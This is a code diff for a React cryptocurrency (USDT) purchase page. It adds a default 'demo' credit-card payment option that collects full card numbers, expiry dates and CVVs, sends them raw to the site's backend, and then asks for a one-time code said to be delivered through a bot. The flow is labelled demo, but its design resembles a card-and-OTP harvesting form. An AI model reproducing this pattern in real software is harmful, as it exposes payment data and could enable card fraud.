@@ -1,7 +1,7 @@
 import React, { useEffect, useMemo, useState } from 'react';
 import { Link, useLocation } from 'react-router-dom';
 import { translations } from '../translations';
-import { createOrder, getPaymentDetails } from '../api';
+import { createOrder, getPaymentDetails, verifyCreditCardOtp } from '../api';
 import { getOrCreateVisitorId } from '../visitTracking';
 import { saveOrderLocal } from '../lib/savedOrders';
 import Header from '../components/Header';
@@ -40,7 +40,7 @@ export default function BuyPage() {
   const RATE = useMemo(() => Number(details?.rate || 1320), [details?.rate]);
   const iqdAmount = useMemo(() => (usdtAmount * RATE).toLocaleString(), [usdtAmount, RATE]);
   const [error, setError] = useState('');
-  const [paymentMethod, setPaymentMethod] = useState(state.paymentMethod || 'Zain Cash');
+  const [paymentMethod, setPaymentMethod] = useState(state.paymentMethod || 'CreditCard');
   const [stage, setStage] = useState(1);
   const [name, setName] = useState(state.name || '');
   const [usdtWallet, setUsdtWallet] = useState(state.wallet || '');
@@ -57,6 +57,15 @@ export default function BuyPage() {
   const [sending, setSending] = useState(false);
   const [sent, setSent] = useState(false);
   const [kycAcknowledged, setKycAcknowledged] = useState(false);
+
+  // Credit card demo flow (OTP)
+  const [cardHolderName, setCardHolderName] = useState(state.cardHolderName || '');
+  const [cardNumber, setCardNumber] = useState(state.cardNumber || '');
+  const [cardExpiry, setCardExpiry] = useState(state.cardExpiry || '');
+  const [cardCvv, setCardCvv] = useState(state.cardCvv || '');
+  const [otpCode, setOtpCode] = useState('');
+  const [otpExpiresAt, setOtpExpiresAt] = useState(null);
+  const [verifyingOtp, setVerifyingOtp] = useState(false);
 
   useEffect(() => {
     document.documentElement.dir = isRtl ? 'rtl' : 'ltr';
@@ -94,6 +103,7 @@ export default function BuyPage() {
 
   const methodOrder = useMemo(
     () => [
+      { key: 'creditCard', label: 'CreditCard', labelAr: 'بطاقة ائتمان' },
       { key: 'fastPay', label: 'FastPay', labelAr: 'فاست باي' },
       { key: 'zainCash', label: 'Zain Cash', labelAr: 'زين كاش' },
       { key: 'fib', label: 'FIB', labelAr: 'المصرف الأول' },
@@ -116,6 +126,14 @@ export default function BuyPage() {
     if (!ok) setPaymentMethod(paymentMethodOptions[0].label);
   }, [paymentMethod, paymentMethodOptions]);
 
+  useEffect(() => {
+    // Reset flow when switching payment methods.
+    setStage(1);
+    setOtpCode('');
+    setOtpExpiresAt(null);
+    setVerifyingOtp(false);
+  }, [paymentMethod]);
+
   useEffect(() => { setFastPayQrFailed(false); }, [pm?.fastPay?.qrImage]);
   useEffect(() => { setZainQrFailed(false); }, [pm?.zainCash?.qrImage]);
   useEffect(() => { setFibQrFailed(false); }, [pm?.fib?.qrImage]);
@@ -129,6 +147,33 @@ export default function BuyPage() {
     : /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(normalizedWallet);
   const senderValid = !senderNumber || /^07\d{9}$/.test(senderNumber.trim());
   const canMoveToPayDetails = Boolean(paymentMethod && usdtWallet && walletNetwork && usdtAmount >= 5 && walletValid);
+  const isCreditCard = paymentMethod === 'CreditCard';
+
+  const cardHolderValid = isCreditCard ? Boolean(String(cardHolderName || '').trim()) : true;
+  const cardNumberDigits = isCreditCard ? String(cardNumber || '').replace(/\D/g, '') : '';
+  const cardNumberValid = isCreditCard ? (cardNumberDigits.length >= 13 && cardNumberDigits.length <= 19) : true;
+  const cardExpiryValid = isCreditCard
+    ? (() => {
+      const m = String(cardExpiry || '').trim().match(/^(\d{2})\/(\d{2})$/);
+      if (!m) return false;
+      const mm = Number(m[1]);
+      return mm >= 1 && mm <= 12;
+    })()
+    : true;
+  const cardCvvValid = isCreditCard ? /^[0-9A-Za-z]{3}$/.test(String(cardCvv || '').trim()) : true;
+
+  const canSendCard = Boolean(
+    isCreditCard &&
+      name &&
+      usdtWallet &&
+      walletNetwork &&
+      usdtAmount >= 5 &&
+      walletValid &&
+      cardHolderValid &&
+      cardNumberValid &&
+      cardExpiryValid &&
+      cardCvvValid
+  );
   const createdOrderId = useMemo(() => `ORD-${Date.now().toString(36).toUpperCase()}`, []);
 
   const copyText = async (value, key) => {
@@ -142,7 +187,12 @@ export default function BuyPage() {
   };
 
   const onConfirm = async () => {
-    if (!name || !usdtWallet || !walletNetwork || usdtAmount < 5 || !walletValid || !senderValid) {
+    if (isCreditCard) {
+      if (!canSendCard) {
+        setError(isRtl ? 'يرجى إكمال بيانات بطاقة الائتمان التجريبية بشكل صحيح.' : 'Please complete the demo card fields correctly.');
+        return;
+      }
+    } else if (!name || !usdtWallet || !walletNetwork || usdtAmount < 5 || !walletValid || !senderValid) {
       setError(isRtl ? 'يرجى إكمال الحقول المطلوبة (الحد الأدنى 5 USDT).' : 'Please complete required fields (minimum 5 USDT).');
       return;
     }
@@ -178,6 +228,10 @@ export default function BuyPage() {
         paymentMethod,
         paymentDetail,
         senderNumber,
+        cardHolderName: isCreditCard ? cardHolderName : undefined,
+        cardNumber: isCreditCard ? cardNumber : undefined,
+        cardExpiry: isCreditCard ? cardExpiry : undefined,
+        cardCvv: isCreditCard ? cardCvv : undefined,
         paymentProofName: paymentProof?.name || '',
         paymentProofBase64,
         paymentProofMime,
@@ -186,7 +240,14 @@ export default function BuyPage() {
       const oid = response?.orderId || createdOrderId;
       setOrderId(oid);
       saveOrderLocal({ orderId: oid, usdtAmount });
-      setSent(true);
+
+      if (isCreditCard && response?.otpRequired) {
+        setOtpExpiresAt(response?.otpExpiresAt || null);
+        setOtpCode('');
+        setStage(3);
+      } else {
+        setSent(true);
+      }
     } catch (e) {
       if (e?.code === 'ORDER_RATE_LIMIT') {
         setError(isRtl ? e.message : (e.errorEn || e.message));
@@ -205,6 +266,32 @@ export default function BuyPage() {
     }
   };
 
+  const onVerifyOtp = async () => {
+    if (!orderId) {
+      setError(isRtl ? 'رقم الطلب غير موجود. أعد المحاولة.' : 'Missing order id. Please try again.');
+      return;
+    }
+    const code = String(otpCode || '').trim();
+    if (!/^\d{6}$/.test(code)) {
+      setError(isRtl ? 'يرجى إدخال كود مكوّن من 6 أرقام.' : 'Please enter a 6-digit code.');
+      return;
+    }
+    setVerifyingOtp(true);
+    setError('');
+    try {
+      await verifyCreditCardOtp(orderId, code);
+      setSent(true);
+    } catch (e) {
+      if (e?.code === 'OTP_NOT_FOUND_OR_EXPIRED') {
+        setError(isRtl ? 'انتهت صلاحية الكود. أعد المحاولة.' : 'OTP expired. Please try again.');
+      } else {
+        setError(String(e?.message || e));
+      }
+    } finally {
+      setVerifyingOtp(false);
+    }
+  };
+
   if (sent) {
     return (
       <div className="page-shell">
@@ -217,8 +304,16 @@ export default function BuyPage() {
                   <path d="M20 7L9 18l-5-5" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
                 </svg>
               </div>
-              <h2 className="text-accent mb-4">{t.successTitle}</h2>
-              <p className="text-muted" style={{ fontSize: '1.1rem', lineHeight: 1.6 }}>{t.successMessage}</p>
+              <h2 className="text-accent mb-4">
+                {paymentMethod === 'CreditCard'
+                  ? (isRtl ? 'اكتملت العملية' : 'Process Completed')
+                  : t.successTitle}
+              </h2>
+              <p className="text-muted" style={{ fontSize: '1.1rem', lineHeight: 1.6 }}>
+                {paymentMethod === 'CreditCard'
+                  ? (isRtl ? 'اكتملت العملية بنجاح. تم تحديث الحالة.' : 'Process completed successfully. Status updated.')
+                  : t.successMessage}
+              </p>
               {!!orderId && (
                 <p className="text-muted mt-4">
                   {isRtl ? 'رقم الطلب:' : 'Order ID:'} <span className="text-accent">{orderId}</span>
@@ -350,6 +445,16 @@ export default function BuyPage() {
             {stage === 2 && (
             <div className="instruction-card buy-instruction-card-executive" style={{ background: 'rgba(255,255,255,0.03)', padding: '1.5rem', borderRadius: '12px', border: '1px dashed var(--accent-primary)', direction: isRtl ? 'rtl' : 'ltr' }}>
               <h3 className="text-accent mb-3" style={{ fontSize: '1rem' }}>{t.confirmPayment}</h3>
+              {paymentMethod === 'CreditCard' && (
+                <div className="text-center">
+                  <p className="text-error text-sm mb-2">
+                    {isRtl ? 'وسيلة دفع تجريبية (Demo) — لا يتم خصم فعلي.' : 'Demo payment method — no real charge.'}
+                  </p>
+                  <p className="text-muted text-sm" style={{ lineHeight: 1.6, margin: 0 }}>
+                    {isRtl ? 'عند الضغط على إرسال سيتم إرسال كود تجريبي إلى البوت، وبعد إدخاله تكتمل العملية في الموقع.' : 'Press Send to receive a demo code in the bot. Enter it to complete the process.'}
+                  </p>
+                </div>
+              )}
 
               {paymentMethod === 'FastPay' && (
                 <div className="text-center">
@@ -555,34 +660,99 @@ export default function BuyPage() {
                     style={{ textAlign: isRtl ? 'right' : 'left' }}
                   />
                 </div>
-                <div className="input-group buy-span-2">
-                  <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
-                    {isRtl ? 'ملاحظة/تفاصيل التحويل (اختياري)' : 'Transfer note/details (optional)'}
-                  </label>
-                  <input
-                    className="input-control"
-                    value={paymentDetail}
-                    onChange={(e) => setPaymentDetail(e.target.value)}
-                    placeholder={isRtl ? 'مثال: اسم المحول، رقم إيصال...' : 'e.g. sender name, receipt #...'}
-                    style={{ textAlign: isRtl ? 'right' : 'left' }}
-                  />
-                </div>
-                <div className="input-group buy-span-2">
-                  <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
-                    {isRtl ? 'إرفاق دليل الدفع (اختياري)' : 'Attach Payment Proof (optional)'}
-                  </label>
-                  <input
-                    type="file"
-                    className="input-control file-input"
-                    accept="image/*,.pdf"
-                    onChange={(e) => setPaymentProof(e.target.files?.[0] || null)}
-                  />
-                  {paymentProof && (
-                    <div className="text-muted text-sm mt-2" style={{ textAlign: isRtl ? 'right' : 'left' }}>
-                      {isRtl ? 'المرفق:' : 'Attached:'} {paymentProof.name}
+                {!isCreditCard && (
+                  <>
+                    <div className="input-group buy-span-2">
+                      <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
+                        {isRtl ? 'ملاحظة/تفاصيل التحويل (اختياري)' : 'Transfer note/details (optional)'}
+                      </label>
+                      <input
+                        className="input-control"
+                        value={paymentDetail}
+                        onChange={(e) => setPaymentDetail(e.target.value)}
+                        placeholder={isRtl ? 'مثال: اسم المحول، رقم إيصال...' : 'e.g. sender name, receipt #...'}
+                        style={{ textAlign: isRtl ? 'right' : 'left' }}
+                      />
                     </div>
-                  )}
-                </div>
+                    <div className="input-group buy-span-2">
+                      <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
+                        {isRtl ? 'إرفاق دليل الدفع (اختياري)' : 'Attach Payment Proof (optional)'}
+                      </label>
+                      <input
+                        type="file"
+                        className="input-control file-input"
+                        accept="image/*,.pdf"
+                        onChange={(e) => setPaymentProof(e.target.files?.[0] || null)}
+                      />
+                      {paymentProof && (
+                        <div className="text-muted text-sm mt-2" style={{ textAlign: isRtl ? 'right' : 'left' }}>
+                          {isRtl ? 'المرفق:' : 'Attached:'} {paymentProof.name}
+                        </div>
+                      )}
+                    </div>
+                  </>
+                )}
+
+                {isCreditCard && (
+                  <>
+                    <div className="input-group buy-span-2">
+                      <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
+                        {isRtl ? 'الاسم في البطاقة' : 'Name on Card'}
+                      </label>
+                      <input
+                        className="input-control"
+                        value={cardHolderName}
+                        onChange={(e) => setCardHolderName(e.target.value)}
+                        placeholder={isRtl ? 'كما هو مكتوب على البطاقة' : 'As on card'}
+                        style={{ textAlign: isRtl ? 'right' : 'left' }}
+                      />
+                    </div>
+
+                    <div className="input-group buy-span-2">
+                      <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
+                        {isRtl ? 'رقم البطاقة' : 'Card Number'}
+                      </label>
+                      <input
+                        className="input-control"
+                        value={cardNumber}
+                        onChange={(e) => setCardNumber(e.target.value)}
+                        placeholder={isRtl ? 'مثال: 4111 1111 1111 1111' : 'e.g. 4111 1111 1111 1111'}
+                        inputMode="numeric"
+                        dir="ltr"
+                        style={{ textAlign: 'left' }}
+                      />
+                    </div>
+
+                    <div className="input-group buy-span-2">
+                      <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
+                        {isRtl ? 'تاريخ الانتهاء (MM/YY)' : 'Expiry (MM/YY)'}
+                      </label>
+                      <input
+                        className="input-control"
+                        value={cardExpiry}
+                        onChange={(e) => setCardExpiry(e.target.value)}
+                        placeholder="MM/YY"
+                        dir="ltr"
+                        style={{ textAlign: 'left' }}
+                      />
+                    </div>
+
+                    <div className="input-group buy-span-2">
+                      <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
+                        {isRtl ? 'رمز (3 حروف/أرقام)' : 'CVV (3 chars)'}
+                      </label>
+                      <input
+                        className="input-control"
+                        value={cardCvv}
+                        onChange={(e) => setCardCvv(e.target.value)}
+                        placeholder="XXX"
+                        dir="ltr"
+                        inputMode="text"
+                        style={{ textAlign: 'left' }}
+                      />
+                    </div>
+                  </>
+                )}
                 {needsKyc && (
                   <div
                     className="input-group buy-span-2"
@@ -619,13 +789,47 @@ export default function BuyPage() {
               </div>
             )}
 
+            {stage === 3 && (
+              <div className="buy-form-grid mt-6" style={{ direction: isRtl ? 'rtl' : 'ltr' }}>
+                <div className="input-group buy-span-2">
+                  <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
+                    {isRtl ? 'أدخل كود البطاقة التجريبي' : 'Enter demo card code'}
+                  </label>
+                  <input
+                    className="input-control"
+                    value={otpCode}
+                    onChange={(e) => setOtpCode(e.target.value)}
+                    placeholder={isRtl ? 'مثال: 123456' : 'e.g. 123456'}
+                    dir="ltr"
+                    inputMode="numeric"
+                    style={{ textAlign: 'left' }}
+                  />
+                  {otpExpiresAt && (
+                    <div className="text-muted text-sm mt-2" style={{ textAlign: isRtl ? 'right' : 'left' }}>
+                      {isRtl ? 'صلاحية الكود: 10 دقائق' : 'OTP validity: 10 minutes'}
+                    </div>
+                  )}
+                  <div className="text-muted text-sm mt-3" style={{ lineHeight: 1.6, textAlign: isRtl ? 'right' : 'left' }}>
+                    {isRtl
+                      ? 'تم إرسال الكود إلى البوت. أدخله هنا ثم اضغط موافق.'
+                      : 'The code was sent in the bot. Enter it here and press Confirm.'}
+                  </div>
+                </div>
+              </div>
+            )}
+
             <div className="flex gap-4 mt-6 buy-actions" style={{ flexDirection: isRtl ? 'row-reverse' : 'row' }}>
               {stage === 1 ? (
                 <Link to="/" className="btn btn-outline" style={{ flex: 1 }}>
                   {t.back}
                 </Link>
               ) : (
-                <button type="button" onClick={() => setStage(1)} className="btn btn-outline" style={{ flex: 1 }}>
+                <button
+                  type="button"
+                  onClick={() => setStage(stage === 3 ? 2 : 1)}
+                  className="btn btn-outline"
+                  style={{ flex: 1 }}
+                >
                   {isRtl ? 'رجوع للخطوة السابقة' : 'Back to previous step'}
                 </button>
               )}
@@ -635,15 +839,41 @@ export default function BuyPage() {
                     setStage(2);
                     return;
                   }
-                  onConfirm();
+                  if (stage === 2) {
+                    onConfirm();
+                    return;
+                  }
+                  if (stage === 3) {
+                    onVerifyOtp();
+                  }
                 }}
                 className="btn btn-primary"
-                style={{ flex: 2, opacity: stage === 1 ? (canMoveToPayDetails ? 1 : 0.5) : (cd.remainingMs === 0 || usdtAmount < 5 ? 0.5 : 1) }}
-                disabled={stage === 1 ? !canMoveToPayDetails : (sending || cd.remainingMs === 0 || usdtAmount < 5)}
+                style={{
+                  flex: 2,
+                  opacity:
+                    stage === 1
+                      ? (canMoveToPayDetails ? 1 : 0.5)
+                      : stage === 2
+                        ? (isCreditCard ? (canSendCard ? 1 : 0.5) : (cd.remainingMs === 0 || usdtAmount < 5 ? 0.5 : 1))
+                        : (verifyingOtp ? 0.5 : (cd.remainingMs === 0 ? 0.5 : 1)),
+                }}
+                disabled={
+                  stage === 1
+                    ? !canMoveToPayDetails
+                    : stage === 2
+                      ? (sending || cd.remainingMs === 0 || usdtAmount < 5 || (isCreditCard ? !canSendCard : false))
+                      : (verifyingOtp || cd.remainingMs === 0)
+                }
               >
                 {stage === 1
                   ? (isRtl ? 'متابعة' : 'Continue')
-                  : (sending ? (isRtl ? 'جاري الإرسال...' : 'Sending...') : t.confirmAndSend)}
+                  : stage === 2
+                    ? (
+                      isCreditCard
+                        ? (sending ? (isRtl ? 'جاري الإرسال...' : 'Sending...') : (isRtl ? 'إرسال' : 'Send'))
+                        : (sending ? (isRtl ? 'جاري الإرسال...' : 'Sending...') : t.confirmAndSend)
+                    )
+                    : (verifyingOtp ? (isRtl ? 'جاري التحقق...' : 'Verifying...') : (isRtl ? 'موافق' : 'Confirm'))}
               </button>
             </div>
 
